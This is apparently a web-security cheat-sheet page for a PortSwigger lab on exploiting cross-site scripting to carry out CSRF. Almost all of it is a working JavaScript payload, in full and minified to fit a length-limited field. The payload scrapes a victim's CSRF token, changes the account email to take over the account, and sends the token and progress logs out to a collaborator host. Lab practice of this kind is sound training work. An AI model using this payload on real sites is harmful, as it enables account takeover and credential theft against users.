# Attacking XSS+CSRF

Example XSS payload (with errorc-checking for debugging) that grabs a CSRF token before submitting a POST request to the target:

```text
<script>
async function exploit() {
  const accURL = '/my-account/';
  const chgURL = '/my-account/change-email';
  const oastURL = 'https://COLLAB_DOMAIN.oastify.com';
  const newEmail = 'x@x.xyz';

  function logOAST(eventType, data = '') {
    let path = `/${encodeURIComponent(eventType)}`;
    if (data) {
      const maxLen = 100;
      let eventDataString = typeof data === 'object' ? JSON.stringify(data) : String(data);
      if (eventDataString.length > maxLen) {
        eventDataString = eventDataString.substring(0, maxLen) + '...[truncated]';
      }
      path += `/${encodeURIComponent(eventDataString)}`;
    }
    new Image().src = oastURL + path;
  }

  logOAST('EXPLOIT_STARTED');

  try {
    const response = await fetch(accURL);
    if (!response.ok) {
      logOAST('ERROR_FETCH_ACCOUNT_PAGE', `Status-${response.status}_${response.statusText}`);
      return;
    }
    const pageHtml = await response.text();
    logOAST('INFO_ACCOUNT_PAGE_FETCHED');
    let csrfToken;

    const parser = new DOMParser();
    const doc = parser.parseFromString(pageHtml, 'text/html');
    const csrfInput = doc.querySelector('input[name="csrf"]');

    if (csrfInput && csrfInput.value) {
      csrfToken = csrfInput.value;
      logOAST('INFO_CSRF_TOKEN_FOUND', csrfToken);
    } else {
      logOAST('ERROR_CSRF_TOKEN_NOT_FOUND');
      return;
    }

    const formData = new URLSearchParams();
    formData.append('email', newEmail);
    formData.append('csrf', csrfToken);

    logOAST('INFO_SUBMITTING_EMAIL_CHANGE');
    const submitResponse = await fetch(chgURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: formData.toString(),
    });

    if (submitResponse.ok) {
      logOAST('SUCCESS_EMAIL_CHANGE_SUBMITTED');
    } else {
      const errorText = await submitResponse.text();
      logOAST('ERROR_EMAIL_CHANGE_FAILED', `Status-${submitResponse.status}_${submitResponse.statusText}_Body-${errorText}`);
    }
  } catch (error) {
    logOAST('ERROR_SCRIPT_EXCEPTION', error.message || String(error));
  }
  logOAST('EXPLOIT_FINISHED');
}
exploit();
</script>
```

Here's a minified version to get under a character-limit in the vulnerable field:

```javascript
<script>
async function x(){u1='/my-account/';u2='/my-account/change-email';O='https://COLLAB_DOMAIN.oastify.com';E='x@x.xyz';L=(t,d)=>{let p=encodeURIComponent(t);if(d||d===0)p+=`/${encodeURIComponent(d)}`;new Image().src=O+`/${p}`};L('S');try{r1=await fetch(u1);if(!r1.ok){L('E1',r1.status+"_"+r1.statusText);return}h=await r1.text();L('F1');let tk;P=new DOMParser();D=P.parseFromString(h,'text/html');ci=D.querySelector('input[name="csrf"]');if(ci&&ci.value){tk=ci.value;L('CF',tk)}else{L('E2');return}L('S2');r2=await fetch(u2,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`email=${E}&csrf=${tk}`});if(r2.ok){L('OK')}else{et=await r2.text();L('E3',r2.status+"_"+r2.statusText+"_"+et)}}catch(ex){L('EX',ex.message||ex)}L('F')}x()
</script>
```

Error code table:

- `EXPLOIT_STARTED` -> `S`
- `ERROR_FETCH_ACCOUNT_PAGE` -> `E1`
- `INFO_ACCOUNT_PAGE_FETCHED` -> `F1`
- `INFO_CSRF_TOKEN_FOUND` -> `CF`
- `ERROR_CSRF_TOKEN_NOT_FOUND` -> `E2`
- `INFO_SUBMITTING_EMAIL_CHANGE` -> `S2`
- `SUCCESS_EMAIL_CHANGE_SUBMITTED` -> `OK`
- `ERROR_EMAIL_CHANGE_FAILED` -> `E3`
- `ERROR_SCRIPT_EXCEPTION` -> `EX`
- `EXPLOIT_FINISHED` -> `F`

Reference: <https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf>